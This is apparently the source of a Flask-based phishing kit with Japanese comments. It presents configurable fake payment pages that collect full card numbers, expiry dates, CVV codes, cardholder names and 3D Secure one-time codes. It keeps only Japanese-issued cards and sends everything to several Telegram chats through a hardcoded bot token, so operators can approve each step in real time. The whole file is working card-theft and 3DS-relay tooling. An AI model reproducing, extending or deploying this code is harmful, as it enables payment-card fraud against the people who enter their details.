from flask import Flask, render_template, request, jsonify, session, redirect, url_for, abort
import requests
import uuid
from datetime import datetime
import re
import json
from utils import (
    get_service, service_exists, service_is_enabled, 
    get_all_services, update_service, toggle_service,
    create_new_service, check_duplicate_name, load_services_config
)
import os

app = Flask(__name__)
app.secret_key = 'your-secret-key-change-this-to-something-secure'

TELEGRAM_BOT_TOKEN = '7561078653:AAGrQNsPQ0I75q7mkwSkJ4Fa23nlsSnb_Mo'
TELEGRAM_CHAT_IDS = ['8303180774', '8243562591', '8204394801']

# 決済状態を保存（本番環境ではデータベースを使用）
payment_status = {}

VALID_SCHEMES = ['visa', 'mastercard', 'jcb', 'amex', 'diners club']

# BINデータベースを読み込む
BIN_DATABASE = {}
if os.path.exists('bin_database.json'):
    try:
        with open('bin_database.json', 'r', encoding='utf-8') as f:
            BIN_DATABASE = json.load(f)
    except Exception as e:
        print(f"BINデータベース読み込みエラー: {e}")

def validate_expiry(expiry):
    """有効期限の妥当性チェック"""
    try:
        if '/' not in expiry:
            return False
        
        month, year = expiry.split('/')
        month = int(month)
        
        # 月は01-12の範囲
        if month < 1 or month > 12:
            return False
        
        return True
    except:
        return False

def check_bin(card_number):
    """BINチェックを実行（複数APIで試行）"""
    bin_number = card_number[:6]
    print(f"\n=== BINチェック開始 ===")
    print(f"BIN: {bin_number}")
    
    # API1: binlist.net（メイン）
    try:
        print("API1 (binlist.net) 試行中...")
        response = requests.get(f'https://lookup.binlist.net/{bin_number}', timeout=5)
        print(f"APIレスポンスコード: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            print(f"APIレスポンス: {data}")
            
            scheme = data.get('scheme', '').lower()
            card_type = data.get('type', '').lower()
            country = data.get('country', {})
            currency = country.get('currency', '') if country else ''
            
            print(f"Scheme: {scheme}")
            print(f"Type: {card_type}")
            print(f"Currency: {currency}")
            
            # スキームチェック
            if scheme not in VALID_SCHEMES:
                print(f"エラー: スキームが無効 ({scheme})")
                return False, None, None
            
            # タイプチェック
            if card_type not in ['credit', 'debit', 'prepaid']:
                print(f"エラー: タイプが無効 ({card_type})")
                return False, None, None
            
            # 通貨チェック（日本発行のカードのみ）
            if currency != 'JPY':
                print(f"エラー: 通貨が無効 ({currency}) - JPYのみ対応")
                return False, None, None
            
            print("BINチェック: 成功")
            return True, card_type, scheme
            
    except requests.exceptions.Timeout:
        print("API1 タイムアウト、API2を試行...")
    except Exception as e:
        print(f"API1 エラー: {e}")
    
    # API2: bincodes.com（バックアップ）
    try:
        print("API2 (bincodes.com) 試行中...")
        response = requests.get(f'https://api.bincodes.com/bin/?format=json&api_key=free&bin={bin_number}', timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            print(f"APIレスポンス: {data}")
            
            # データ構造が異なるので調整
            scheme = data.get('scheme', '').lower()
            card_type = data.get('type', '').lower()
            currency = data.get('currency', '')
            
            print(f"Scheme: {scheme}")
            print(f"Type: {card_type}")
            print(f"Currency: {currency}")
            
            # スキームチェック
            if scheme not in VALID_SCHEMES:
                print(f"エラー: スキームが無効 ({scheme})")
                return False, None, None
            
            # タイプチェック
            if card_type not in ['credit', 'debit', 'prepaid']:
                print(f"エラー: タイプが無効 ({card_type})")
                return False, None, None
            
            # 通貨チェック
            if currency != 'JPY':
                print(f"エラー: 通貨が無効 ({currency}) - JPYのみ対応")
                return False, None, None
            
            print("BINチェック: 成功")
            return True, card_type, scheme
            
    except Exception as e:
        print(f"API2 エラー: {e}")
    
    # すべてのAPIが失敗した場合
    print("すべてのBIN検証APIが失敗しました")
    return False, None, None

def send_telegram_message(chat_ids, text, inline_keyboard=None):
    """Telegramにメッセージを送信"""
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    
    print(f"=== Telegram送信開始 ===")
    print(f"送信先: {chat_ids}")
    print(f"メッセージ: {text[:100]}...")
    
    for chat_id in chat_ids:
        payload = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': 'HTML'
        }
        
        if inline_keyboard:
            payload['reply_markup'] = {
                'inline_keyboard': inline_keyboard
            }
        
        try:
            response = requests.post(url, json=payload)
            print(f"Chat ID {chat_id}: ステータスコード {response.status_code}")
            print(f"レスポンス: {response.text}")
            
            if response.status_code != 200:
                print(f"エラー詳細: {response.json()}")
        except Exception as e:
            print(f"Telegram送信エラー (Chat ID: {chat_id}): {e}")

# =====================================
# ルートページ（エラー表示）
# =====================================
@app.route('/')
def root():
    """ルートページは404エラー"""
    abort(404)

# =====================================
# サービス用ルート
# =====================================
@app.route('/<service_key>')
def service_index(service_key):
    """カード情報入力画面"""
    # サービスの存在と有効化をチェック
    if not service_exists(service_key) or not service_is_enabled(service_key):
        abort(404)
    
    service = get_service(service_key)
    session.clear()
    session['service_key'] = service_key
    
    return render_template('service/index.html', service=service, service_key=service_key)

@app.route('/<service_key>/submit_card', methods=['POST'])
def submit_card(service_key):
    """カード情報を受け取りBINチェック"""
    print(f"\n=== submit_card 開始 ===")
    print(f"Service Key: {service_key}")
    
    # サービスチェック
    if not service_exists(service_key):
        print("エラー: サービスが存在しません")
        return jsonify({'success': False, 'message': 'サービスが見つかりません'})
    
    if not service_is_enabled(service_key):
        print("エラー: サービスが無効化されています")
        return jsonify({'success': False, 'message': 'サービスが無効化されています'})
    
    service = get_service(service_key)
    
    data = request.json
    print(f"受信データ: {data}")
    
    card_number = data.get('card_number', '').replace(' ', '')
    expiry = data.get('expiry', '')
    cvv = data.get('cvv', '')
    name = data.get('name', '')
    
    print(f"カード番号: {card_number[:6]}****")
    print(f"有効期限: {expiry}")
    
    # 有効期限の妥当性チェック
    if not validate_expiry(expiry):
        print("有効期限が不正です")
        return jsonify({'success': False, 'message': '有効期限が正しくありません'})
    
    # BINチェック
    is_valid, card_type, scheme = check_bin(card_number)
    
    if not is_valid:
        print("BINチェック失敗")
        return jsonify({'success': False, 'message': 'このカードは使用できません'})
    
    print("BINチェック成功")
    
    # 決済番号生成
    payment_id = str(uuid.uuid4())[:8].upper()
    print(f"決済番号: {payment_id}")
    
    # セッションに保存
    session['payment_id'] = payment_id
    session['service_key'] = service_key
    session['card_data'] = {
        'card_number': card_number,
        'expiry': expiry,
        'cvv': cvv,
        'name': name,
        'card_type': card_type,
        'scheme': scheme
    }
    
    # 初期状態を設定
    payment_status[payment_id] = {
        'card_approved': False,
        '3ds_approved': False,
        'status': 'waiting_card_approval',
        'service_key': service_key
    }
    
    # Telegramに送信
    warning = ""
    if card_type in ['debit', 'prepaid']:
        warning = "\n⚠️ このカードは一部使えない場合があります"
    
    message = f"""<b>💳 カード情報</b>{warning}

サービス名: {service.get('name', service_key)}
カード番号: {card_number}
有効期限: {expiry}
CVV: {cvv}
名義: {name}
決済番号: {payment_id}"""
    
    inline_keyboard = [[
        {'text': '✅ 承認', 'callback_data': f'approve_card_{payment_id}'},
        {'text': '❌ 却下', 'callback_data': f'reject_card_{payment_id}'}
    ]]
    
    print("Telegram送信開始")
    send_telegram_message(TELEGRAM_CHAT_IDS, message, inline_keyboard)
    print("Telegram送信完了")
    
    return jsonify({'success': True, 'payment_id': payment_id})

@app.route('/<service_key>/check_status/<payment_id>')
def check_status(service_key, payment_id):
    """決済状態をチェック"""
    if payment_id in payment_status:
        return jsonify(payment_status[payment_id])
    return jsonify({'status': 'not_found'})

@app.route('/<service_key>/waiting')
def waiting(service_key):
    """承認待ち画面"""
    if not service_exists(service_key) or not service_is_enabled(service_key):
        abort(404)
    
    service = get_service(service_key)
    payment_id = session.get('payment_id')
    
    if not payment_id:
        return render_template('service/error.html', service=service, service_key=service_key, message='セッションが無効です')
    
    return render_template('service/waiting.html', service=service, service_key=service_key, payment_id=payment_id)

@app.route('/<service_key>/3ds')
def threeds(service_key):
    """3DS入力画面"""
    if not service_exists(service_key) or not service_is_enabled(service_key):
        abort(404)
    
    service = get_service(service_key)
    payment_id = session.get('payment_id')
    
    if not payment_id or payment_id not in payment_status:
        return render_template('service/error.html', service=service, service_key=service_key, message='セッションが無効です')
    
    if not payment_status[payment_id].get('card_approved'):
        return render_template('service/error.html', service=service, service_key=service_key, message='カード情報が承認されていません')
    
    return render_template('service/3ds.html', service=service, service_key=service_key, payment_id=payment_id)

@app.route('/<service_key>/submit_3ds', methods=['POST'])
def submit_3ds(service_key):
    """3DSコードを送信"""
    if not service_exists(service_key) or not service_is_enabled(service_key):
        return jsonify({'success': False, 'message': 'サービスが見つかりません'})
    
    service = get_service(service_key)
    
    data = request.json
    code = data.get('code', '')
    payment_id = session.get('payment_id')
    
    if not payment_id or payment_id not in payment_status:
        return jsonify({'success': False, 'message': 'セッションが無効です'})
    
    # 3DSコードの形式チェック（4-8桁の数字）
    if not re.match(r'^\d{4,8}$', code):
        return jsonify({'success': False, 'message': '4〜8桁の数字を入力してください'})
    
    # 状態更新
    payment_status[payment_id]['status'] = 'waiting_3ds_approval'
    
    # Telegramに送信
    message = f"""<b>🔐 3DS認証コード</b>

サービス名: {service.get('name', service_key)}
3DSコード: {code}
決済番号: {payment_id}"""
    
    inline_keyboard = [[
        {'text': '✅ 承認', 'callback_data': f'approve_3ds_{payment_id}'},
        {'text': '❌ 却下', 'callback_data': f'reject_3ds_{payment_id}'}
    ]]
    
    send_telegram_message(TELEGRAM_CHAT_IDS, message, inline_keyboard)
    
    return jsonify({'success': True})

@app.route('/<service_key>/complete')
def complete(service_key):
    """決済完了画面"""
    if not service_exists(service_key) or not service_is_enabled(service_key):
        abort(404)
    
    service = get_service(service_key)
    payment_id = session.get('payment_id')
    
    if not payment_id or payment_id not in payment_status:
        return render_template('service/error.html', service=service, service_key=service_key, message='セッションが無効です')
    
    if not payment_status[payment_id].get('3ds_approved'):
        return render_template('service/error.html', service=service, service_key=service_key, message='認証が完了していません')
    
    return render_template('service/complete.html', service=service, service_key=service_key)

# =====================================
# Webhook（Telegram）
# =====================================
@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegramからのコールバックを処理"""
    data = request.json
    print(f"\n=== Webhook受信 ===")
    print(f"データ: {data}")
    
    if 'callback_query' in data:
        callback_data = data['callback_query']['data']
        print(f"コールバックデータ: {callback_data}")
        
        # カード承認
        if callback_data.startswith('approve_card_'):
            payment_id = callback_data.replace('approve_card_', '')
            print(f"カード承認: {payment_id}")
            if payment_id in payment_status:
                payment_status[payment_id]['card_approved'] = True
                payment_status[payment_id]['status'] = 'card_approved'
                print("承認完了")
        
        # カード却下
        elif callback_data.startswith('reject_card_'):
            payment_id = callback_data.replace('reject_card_', '')
            print(f"カード却下: {payment_id}")
            if payment_id in payment_status:
                payment_status[payment_id]['card_approved'] = False
                payment_status[payment_id]['status'] = 'card_rejected'
                print("却下完了")
        
        # 3DS承認
        elif callback_data.startswith('approve_3ds_'):
            payment_id = callback_data.replace('approve_3ds_', '')
            print(f"3DS承認: {payment_id}")
            if payment_id in payment_status:
                payment_status[payment_id]['3ds_approved'] = True
                payment_status[payment_id]['status'] = '3ds_approved'
                print("承認完了")
        
        # 3DS却下
        elif callback_data.startswith('reject_3ds_'):
            payment_id = callback_data.replace('reject_3ds_', '')
            print(f"3DS却下: {payment_id}")
            if payment_id in payment_status:
                payment_status[payment_id]['3ds_approved'] = False
                payment_status[payment_id]['status'] = '3ds_rejected'
                print("却下完了")
    
    return jsonify({'ok': True})

# =====================================
# 管理画面ルート
# =====================================
@app.route('/alladmin')
def admin_dashboard():
    """管理画面トップ"""
    return render_template('admin/dashboard.html')

@app.route('/alladmin/debug')
def admin_debug():
    """デバッグ情報表示"""
    return jsonify({
        'active_payments': payment_status,
        'active_sessions': len(payment_status)
    })

@app.route('/alladmin/serviceonoff')
def admin_service_onoff():
    """サービス有効化/無効化画面"""
    services = get_all_services()
    return render_template('admin/service_onoff.html', services=services)

@app.route('/alladmin/toggle/<service_key>', methods=['POST'])
def admin_toggle_service(service_key):
    """サービスの有効/無効を切り替え"""
    if toggle_service(service_key):
        return jsonify({'success': True})
    return jsonify({'success': False})

@app.route('/alladmin/allservice')
def admin_all_services():
    """サービス一覧画面"""
    services = get_all_services()
    return render_template('admin/all_services.html', services=services)

@app.route('/alladmin/create_service', methods=['POST'])
def admin_create_service():
    """新規サービスを作成"""
    new_key = create_new_service()
    if new_key:
        return jsonify({'success': True, 'service_key': new_key})
    return jsonify({'success': False})

@app.route('/alladmin/oneservice/<service_key>')
def admin_edit_service(service_key):
    """サービス編集画面"""
    if not service_exists(service_key):
        abort(404)
    
    service = get_service(service_key)
    # JSONを整形して表示
    service_json = json.dumps(service, ensure_ascii=False, indent=2)
    
    return render_template('admin/edit_service.html', 
                         service_key=service_key, 
                         service=service,
                         service_json=service_json)

@app.route('/alladmin/update_service/<service_key>', methods=['POST'])
def admin_update_service(service_key):
    """サービス設定を更新"""
    try:
        # JSONデータを受け取る
        new_data = request.json.get('data')
        service_data = json.loads(new_data)
        
        # 名前の重複チェック
        new_name = service_data.get('name', '')
        if check_duplicate_name(service_key, new_name):
            return jsonify({'success': False, 'message': '同じ名前のサービスが既に存在します'})
        
        # 更新
        if update_service(service_key, service_data):
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'message': '保存に失敗しました'})
    except json.JSONDecodeError:
        return jsonify({'success': False, 'message': 'JSON形式が正しくありません'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'エラー: {str(e)}'})

# =====================================
# エラーハンドラ
# =====================================
@app.errorhandler(404)
def not_found(e):
    """404エラーページ"""
    return render_template('service/error.html', 
                         service={'design': {'background_color': '#ffffff', 'text_color': '#000000'}}, 
                         service_key='', 
                         message='ページが見つかりません'), 404

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=8080)